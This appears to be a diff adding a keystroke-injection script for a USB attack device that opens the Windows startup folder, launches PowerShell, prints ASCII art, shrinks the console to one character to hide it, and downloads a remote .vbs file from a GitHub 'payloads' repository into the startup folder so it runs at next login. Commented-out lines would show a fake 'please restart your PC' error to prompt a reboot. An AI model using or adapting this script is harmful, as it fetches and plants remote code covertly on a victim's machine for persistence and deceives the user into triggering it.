@@ -1,0 +1,63 @@
+GUI r
+DELAY 100
+STRINGLN shell:startup
+DELAY 100
+ALT D
+DELAY 20
+STRINGLN POWERSHELL.exe 
+DELAY 1000
+STRINGLN       ,-._.-._.-._.-._.-.       ,-------------------------------------.
+STRINGLN       `-.             ,-'       |                                       |
+STRINGLN         |             |        |                                       |
+STRINGLN         |             |        |                                       |
+STRINGLN         |             |        |          DON'T BREAK STUFF!           |
+STRINGLN         |    .. ,.    |        |                                       |
+STRINGLN       ,-|___|  |  |___|-.      |                                       |
+STRINGLN       | |   L__;__J   | |     ,'                                       |
+STRINGLN       `|      / \      |'     / _.-------------------------------------'
+STRINGLN        |     (   )     |     ;-'
+STRINGLN        |      `''      |
+STRINGLN        |               |
+STRINGLN        |               |
+STRINGLN        ;--..._____...--;            ==================================.
+STRINGLN       ,'--.._/   \_..--`.                        ,                     |\
+STRINGLN      /       `. ,'       \                      /|                     | \
+STRINGLN     /    /`.  | |    _l_  \                    / |                     |  \
+STRINGLN    /_/   \  \_J |  |"   |\_\ ________________/  |                     |   \
+STRINGLN    //     `-.__.'  |    | \\                 |   |                     |   [==]
+STRINGLN   ||           |   `---'   ||           _____|_____________________________||
+STRINGLN   ||           |           ||          |                                   ||
+STRINGLN  ||            |            ||         |   _____________                   ||
+STRINGLN  ||            |            ||         |  (             )                  ||
+STRINGLN  ||            |            ||         |   `"""""""""""'                    ||
+STRINGLN ;' |           |           | `;         |                                   ||
+STRINGLN  `' \          |          / `'           |                                   ||
+STRINGLN      `--..____/ \____..--'              |                                   ||
+STRINGLN        |       |       |               |                                   ||
+STRINGLN        |       |       |               |                                   ||
+STRINGLN        |       |       |               |                                   ||
+STRINGLN        |       |       |               |                                   ||
+STRINGLN        |       |       |               |                                   ||
+STRINGLN        |       |       |     __________|                                   ||
+STRINGLN        |       |       |               |                                   ||
+STRINGLN        |       |       |               |___________________________________||
+STRINGLN        |       |       |
+STRINGLN        |       |       |
+STRINGLN        |_______|_______|
+STRINGLN  _..--'      |   |      `--.._
+STRINGLN ;________.___|   |___.________;
+STRINGLN 
+
+DELAY 10000
+STRINGLN [console]::WindowHeight=1
+STRINGLN [console]::WindowWidth=1
+DELAY 200
+STRINGLN Invoke-WebRequest -Uri https://raw.githubusercontent.com/Fred-the-bot/payloads/main/innocent_test.vbs -OutFile .\innocent.vbs
+DELAY 500
+REM STRINGLN $wshell = New-Object -ComObject Wscript.Shell
+REM DELAY 50
+REM STRINGLN $Output = $wshell.Popup("An error occured, please restart your PC",10,"ALERT",16)
+REM DELAY 40
+ALT SPACE 
+DELAY 10
+STRING c
